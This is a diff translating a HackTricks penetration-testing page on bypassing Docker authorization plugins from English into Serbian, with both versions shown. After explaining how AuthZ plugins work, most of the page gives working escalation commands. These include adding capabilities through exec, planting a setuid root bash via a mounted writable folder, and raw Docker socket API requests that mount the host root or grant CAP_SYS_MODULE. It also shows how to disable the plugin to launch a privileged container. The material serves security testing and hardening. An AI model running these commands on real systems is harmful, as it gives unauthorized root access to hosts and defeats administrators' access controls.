@@ -1,90 +1,83 @@
-
-
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Drugi načini podrške HackTricks-u:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
+* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
 
 
-**Docker’s** out-of-the-box **authorization** model is **all or nothing**. Any user with permission to access the Docker daemon can **run any** Docker client **command**. The same is true for callers using Docker’s Engine API to contact the daemon. If you require **greater access control**, you can create **authorization plugins** and add them to your Docker daemon configuration. Using an authorization plugin, a Docker administrator can **configure granular access** policies for managing access to the Docker daemon.
+Docker-ov podrazumevani model **autorizacije** je **sve ili ništa**. Svaki korisnik sa dozvolom za pristup Docker demonu može **izvršiti bilo koju** Docker klijent **komandu**. Isto važi i za pozivatelje koji koriste Docker-ov Engine API da bi kontaktirali demon. Ako zahtevate **veću kontrolu pristupa**, možete kreirati **pluginske za autorizaciju** i dodati ih u konfiguraciju vašeg Docker demona. Korišćenjem pluginske za autorizaciju, Docker administrator može **konfigurisati granularne pristupne politike** za upravljanje pristupom Docker demonu.
 
-# Basic architecture
+# Osnovna arhitektura
 
-Docker Auth plugins are **external** **plugins** you can use to **allow/deny** **actions** requested to the Docker Daemon **depending** on the **user** that requested it and the **action** **requested**.
+Docker Auth plugini su **eksterni plugini** koje možete koristiti da **dozvolite/odbijete** **akcije** koje su zatražene od Docker Demona **u zavisnosti** od **korisnika** koji je to zatražio i **akcije** koja je **zatražena**.
 
-**[The following info is from the docs](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**
+**[Sledeće informacije su iz dokumentacije](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**
 
-When an **HTTP** **request** is made to the Docker **daemon** through the CLI or via the Engine API, the **authentication** **subsystem** **passes** the request to the installed **authentication** **plugin**(s). The request contains the user (caller) and command context. The **plugin** is responsible for deciding whether to **allow** or **deny** the request.
+Kada se **HTTP zahtev** napravi Docker **demonu** putem CLI-ja ili putem Engine API-ja, podsistem za **autentifikaciju** prosleđuje zahtev instaliranim **pluginskim za autentifikaciju**. Zahtev sadrži korisnika (pozivaoca) i kontekst komande. Plugin je odgovoran za odlučivanje da li **dozvoliti** ili **odbijati** zahtev.
 
-The sequence diagrams below depict an allow and deny authorization flow:
+Dole prikazani dijagrami sekvence prikazuju tok dozvole i odbijanja autorizacije:
 
-![Authorization Allow flow](https://docs.docker.com/engine/extend/images/authz\_allow.png)
+![Tok dozvole autorizacije](https://docs.docker.com/engine/extend/images/authz\_allow.png)
 
-![Authorization Deny flow](https://docs.docker.com/engine/extend/images/authz\_deny.png)
+![Tok odbijanja autorizacije](https://docs.docker.com/engine/extend/images/authz\_deny.png)
 
-Each request sent to the plugin **includes the authenticated user, the HTTP headers, and the request/response body**. Only the **user name** and the **authentication method** used are passed to the plugin. Most importantly, **no** user **credentials** or tokens are passed. Finally, **not all request/response bodies are sent** to the authorization plugin. Only those request/response bodies where the `Content-Type` is either `text/*` or `application/json` are sent.
+Svaki zahtev poslat pluginu **uključuje autentifikovanog korisnika, HTTP zaglavlja i telo zahteva/odgovora**. Pluginu se prosleđuju samo **korisničko ime** i **metoda autentifikacije** koja je korišćena. Najvažnije, **ne prosleđuju se korisnički podaci** ili tokeni. Na kraju, **ne sva zahteva/odgovora se šalju** pluginskoj za autorizaciju. Samo ona zahteva/odgovora gde je `Content-Type` ili `text/*` ili `application/json` se šalju.
 
-For commands that can potentially hijack the HTTP connection (`HTTP Upgrade`), such as `exec`, the authorization plugin is only called for the initial HTTP requests. Once the plugin approves the command, authorization is not applied to the rest of the flow. Specifically, the streaming data is not passed to the authorization plugins. For commands that return chunked HTTP response, such as `logs` and `events`, only the HTTP request is sent to the authorization plugins.
+Za komande koje potencijalno mogu preuzeti HTTP konekciju (`HTTP Upgrade`), kao što je `exec`, pluginska za autorizaciju se poziva samo za početne HTTP zahteve. Kada plugin odobri komandu, autorizacija se ne primenjuje na ostatak toka. Konkretno, podaci u toku strimovanja se ne prosleđuju pluginskim za autorizaciju. Za komande koje vraćaju HTTP odgovor u delovima, kao što su `logs` i `events`, samo HTTP zahtev se šalje pluginskim za autorizaciju.
 
-During request/response processing, some authorization flows might need to do additional queries to the Docker daemon. To complete such flows, plugins can call the daemon API similar to a regular user. To enable these additional queries, the plugin must provide the means for an administrator to configure proper authentication and security policies.
+Tokom obrade zahteva/odgovora, neki tokovi autorizacije mogu zahtevati dodatne upite Docker demonu. Da bi se završili takvi tokovi, plugini mogu pozvati API demona slično kao redovan korisnik. Da bi omogućili ove dodatne upite, plugin mora obezbediti način da administrator konfiguriše odgovarajuće autentifikaciju i sigurnosne politike.
 
-## Several Plugins
+## Više Pluginova
 
-You are responsible for **registering** your **plugin** as part of the Docker daemon **startup**. You can install **multiple plugins and chain them together**. This chain can be ordered. Each request to the daemon passes in order through the chain. Only when **all the plugins grant access** to the resource, is the access granted.
+Vi ste odgovorni za **registrovanje** vašeg **plugina** kao deo pokretanja Docker demona. Možete instalirati **više pluginova i povezati ih zajedno**. Ovaj lanac može biti uređen. Svaki zahtev demonu prolazi kroz lanac redom. Samo kada **svi pluginovi odobre pristup** resursu, pristup je odobren.
 
-# Plugin Examples
+# Primeri Pluginova
 
 ## Twistlock AuthZ Broker
 
-The plugin [**authz**](https://github.com/twistlock/authz) allows you to create a simple **JSON** file that the **plugin** will be **reading** to authorize the requests. Therefore, it gives you the opportunity to control very easily which API endpoints can reach each user.
+Plugin [**authz**](https://github.com/twistlock/authz) vam omogućava da kreirate jednostavan **JSON** fajl koji će plugin **čitati** kako bi autorizovao zahteve. Na taj način vam pruža mogućnost da veoma lako kontrolišete koje API tačke mogu dostići svaki korisnik.
 
-This is an example that will allow Alice and Bob can create new containers: `{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`
+Ovo je primer koji će dozvoliti Alice i Bob-u da kreiraju nove kontejnere: `{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`
 
-In the page [route\_parser.go](https://github.com/twistlock/authz/blob/master/core/route\_parser.go) you can find the relation between the requested URL and the action. In the page [types.go](https://github.com/twistlock/authz/blob/master/core/types.go) you can find the relation between the action name and the action
+Na stranici [route\_parser.go](https://github.com/twistlock/authz/blob/master/core/route\_parser.go) možete pronaći vezu između traženog URL-a i akcije. Na stranici [types.go](https://github.com/twistlock/authz/blob/master/core/types.go) možete pronaći vezu između imena akcije i akcije.
 
-## Simple Plugin Tutorial
+## Jednostavan Tutorijal za Plugin
 
-You can find an **easy to understand plugin** with detailed information about installation and debugging here: [**https://github.com/carlospolop-forks/authobot**](https://github.com/carlospolop-forks/authobot)
+Možete pronaći **lako razumljiv plugin** sa detaljnim informacijama o instalaciji i debagovanju ovde: [**https://github.com/carlospolop-forks/authobot**](https://github.com/carlospolop-forks/authobot)
 
-Read the `README` and the `plugin.go` code to understand how is it working.
+Pročitajte `README` i kod `plugin.go` da biste razumeli kako radi.
 
-# Docker Auth Plugin Bypass
+# Bypass Docker Auth Plugin
 
-## Enumerate access
+## Nabrojavanje pristupa
 
-The main things to check are the **which endpoints are allowed** and **which values of HostConfig are allowed**.
+Glavne stvari koje treba proveriti su **koje tačke su dozvoljene** i **koje vrednosti HostConfig su dozvoljene**.
 
-To perform this enumeration you can **use the tool** [**https://github.com/carlospolop/docker\_auth\_profiler**](https://github.com/carlospolop/docker\_auth\_profiler)**.**
+Da biste izvršili ovu nabrojavanje, možete **koristiti alat** [**https://github.com/carlospolop/docker\_auth\_profiler**](https://github.com/carlospolop/docker\_auth\_profiler)**.**
 
-## disallowed `run --privileged`
+## Nedozvoljen `run --privileged`
 
-### Minimum Privileges
-
+### Minimalne privilegije
 ```bash
 docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
 ```
+### Pokretanje kontejnera i dobijanje privilegovanog sesije
 
-### Running a container and then getting a privileged session
-
-In this case the sysadmin **disallowed users to mount volumes and run containers with the `--privileged` flag** or give any extra capability to the container:
-
+U ovom slučaju, sistem administrator **onemogućio je korisnicima da montiraju volumene i pokreću kontejnere sa `--privileged` zastavicom** ili daju bilo kakvu dodatnu sposobnost kontejneru:
 ```bash
 docker run -d --privileged modified-ubuntu
 docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
 See 'docker run --help'.
 ```
-
-However, a user can **create a shell inside the running container and give it the extra privileges**:
-
+Međutim, korisnik može **kreirati shell unutar pokrenutog kontejnera i dati mu dodatne privilegije**:
 ```bash
 docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu
 #bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de
@@ -96,43 +89,39 @@ docker exec -it ---cap-add=ALL bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be
 # With --cap-add=SYS_ADMIN
 docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
 ```
+Sada korisnik može da pobegne iz kontejnera koristeći bilo koju od [**prethodno diskutovanih tehnika**](./#privileged-flag) i **poveća privilegije** unutar hosta.
 
-Now, the user can escape from the container using any of the [**previously discussed techniques**](./#privileged-flag) and **escalate privileges** inside the host.
+## Montiranje foldera sa dozvolom pisanja
 
-## Mount Writable Folder
-
-In this case the sysadmin **disallowed users to run containers with the `--privileged` flag** or give any extra capability to the container, and he only allowed to mount the `/tmp` folder:
-
+U ovom slučaju, sistem administrator je **onemogućio korisnicima da pokreću kontejnere sa `--privileged` zastavicom** ili daje bilo kakve dodatne mogućnosti kontejneru, i dozvolio je samo montiranje `/tmp` foldera:
 ```bash
 host> cp /bin/bash /tmp #Cerate a copy of bash
 host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
 docker container> chown root:root /host/bash
 docker container> chmod u+s /host/bash
 host> /tmp/bash
- -p #This will give you a shell as root
+-p #This will give you a shell as root
 ```
-
 {% hint style="info" %}
-Note that maybe you cannot mount the folder `/tmp` but you can mount a **different writable folder**. You can find writable directories using: `find / -writable -type d 2>/dev/null`
+Imajte na umu da možda ne možete montirati direktorijum `/tmp`, ali možete montirati **drug direktorijum za pisanje**. Možete pronaći direktorijume za pisanje koristeći: `find / -writable -type d 2>/dev/null`
 
-**Note that not all the directories in a linux machine will support the suid bit!** In order to check which directories support the suid bit run `mount | grep -v "nosuid"` For example usually `/dev/shm` , `/run` , `/proc` , `/sys/fs/cgroup` and `/var/lib/lxcfs` don't support the suid bit.
+**Imajte na umu da neće svi direktorijumi na Linux mašini podržavati suid bit!** Da biste proverili koji direktorijumi podržavaju suid bit, pokrenite `mount | grep -v "nosuid"`. Na primer, obično `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` i `/var/lib/lxcfs` ne podržavaju suid bit.
 
-Note also that if you can **mount `/etc`** or any other folder **containing configuration files**, you may change them from the docker container as root in order to **abuse them in the host** and escalate privileges (maybe modifying `/etc/shadow`)
+Takođe imajte na umu da ako možete **montirati `/etc`** ili bilo koji drugi direktorijum **koji sadrži konfiguracione fajlove**, možete ih promeniti iz Docker kontejnera kao root kako biste ih zloupotrebili na hostu i eskalirali privilegije (možda izmenom `/etc/shadow`).
 {% endhint %}
 
-## Unchecked API Endpoint
+## Neproverena API tačka
 
-The responsibility of the sysadmin configuring this plugin would be to control which actions and with which privileges each user can perform. Therefore, if the admin takes a **blacklist** approach with the endpoints and the attributes he might **forget some of them** that could allow an attacker to **escalate privileges.**
+Odgovornost sistem administratora koji konfiguriše ovaj plugin je da kontroliše koje akcije i sa kojim privilegijama svaki korisnik može izvršiti. Stoga, ako administrator koristi **crnu listu** za pristupne tačke i atribute, može se desiti da **zaboravi neke od njih** koje bi omogućile napadaču da eskalira privilegije.
 
-You can check the docker API in [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#)
+Možete proveriti Docker API na [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#)
 
-## Unchecked JSON Structure
+## Neproverena JSON struktura
 
-### Binds in root
+### Binds u root-u
 
-It's possible that when the sysadmin configured the docker firewall he **forgot about some important parameter** of the [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) like "**Binds**".\
-In the following example it's possible to abuse this misconfiguration to create and run a container that mounts the root (/) folder of the host:
-
+Moguće je da je sistem administrator prilikom konfigurisanja Docker firewall-a **zaboravio na neki važan parametar** [**API-ja**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) kao što je "**Binds**".\
+U sledećem primeru moguće je iskoristiti ovu konfiguraciju da se kreira i pokrene kontejner koji montira root (/) folder hosta:
 ```bash
 docker version #First, find the API version of docker, 1.40 in this example
 docker images #List the images available
@@ -142,39 +131,31 @@ docker start f6932bc153ad #Start the created privileged container
 docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
 #You can access the host filesystem
 ```
-
 {% hint style="warning" %}
-Note how in this example we are using the **`Binds`** param as a root level key in the JSON but in the API it appears under the key **`HostConfig`**
+Primetite kako u ovom primeru koristimo **`Binds`** parametar kao ključ na nivou korena u JSON-u, ali u API-ju se pojavljuje pod ključem **`HostConfig`**
 {% endhint %}
 
-### Binds in HostConfig
+### Binds u HostConfig-u
 
-Follow the same instruction as with **Binds in root** performing this **request** to the Docker API:
-
+Sledite iste instrukcije kao i za **Binds u korenu** izvršavajući ovaj **zahtev** prema Docker API-ju:
 ```bash
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
 ```
+### Montaže u korenu
 
-### Mounts in root
-
-Follow the same instruction as with **Binds in root** performing this **request** to the Docker API:
-
+Pratite iste instrukcije kao i za **Veze u korenu** izvršavajući ovaj **zahtev** prema Docker API-ju:
 ```bash
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
 ```
+### Montaže u HostConfig-u
 
-### Mounts in HostConfig
-
-Follow the same instruction as with **Binds in root** performing this **request** to the Docker API:
-
+Pratite iste instrukcije kao i za **Veze u root-u** izvršavajući ovaj **zahtev** prema Docker API-ju:
 ```bash
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
 ```
+## Neprovereni JSON atribut
 
-## Unchecked JSON Attribute
-
-It's possible that when the sysadmin configured the docker firewall he **forgot about some important attribute of a parameter** of the [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) like "**Capabilities**" inside "**HostConfig**". In the following example it's possible to abuse this misconfiguration to create and run a container with the **SYS\_MODULE** capability:
-
+Moguće je da je sistem administrator prilikom konfigurisanja docker firewall-a **zaboravio na neki važan atribut parametra** [**API-ja**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) kao što je "**Capabilities**" unutar "**HostConfig**". U sledećem primeru je moguće iskoristiti ovu lošu konfiguraciju kako bi se kreirao i pokrenuo kontejner sa **SYS\_MODULE** sposobnostima:
 ```bash
 docker version
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
@@ -184,15 +165,13 @@ docker exec -it c52a77629a91 bash
 capsh --print
 #You can abuse the SYS_MODULE capability
 ```
-
 {% hint style="info" %}
-The **`HostConfig`** is the key that usually contains the **interesting** **privileges** to escape from the container. However, as we have discussed previously, note how using Binds outside of it also works and may allow you to bypass restrictions.
+**`HostConfig`** je ključ koji obično sadrži **zanimljive** **privilegije** za bekstvo iz kontejnera. Međutim, kao što smo već diskutovali, primetite kako korišćenje Binds izvan njega takođe funkcioniše i može vam omogućiti da zaobiđete ograničenja.
 {% endhint %}
 
-## Disabling Plugin
+## Onemogućavanje dodatka
 
-If the **sysadmin** **forgotten** to **forbid** the ability to **disable** the **plugin**, you can take advantage of this to completely disable it!
-
+Ako je **sistemski administrator** **zaboravio** da **zabrani** mogućnost **onemogućavanja** dodatka, možete iskoristiti to da ga potpuno onemogućite!
 ```bash
 docker plugin list #Enumerate plugins
 
@@ -204,30 +183,27 @@ docker plugin disable authobot
 docker run --rm -it --privileged -v /:/host ubuntu bash
 docker plugin enable authobot
 ```
+Zapamtite da **ponovo omogućite dodatak nakon eskalacije**, inače **restartovanje docker servisa neće raditi**!
 
-Remember to **re-enable the plugin after escalating**, or a **restart of docker service won’t work**!
-
-## Auth Plugin Bypass writeups
+## Bypass writeups za Auth Plugin
 
 * [https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/](https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/)
 
-## References
+## Reference
 
 * [https://docs.docker.com/engine/extend/plugins\_authorization/](https://docs.docker.com/engine/extend/plugins\_authorization/)
 
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Drugi načini da podržite HackTricks:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
+* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
-
-
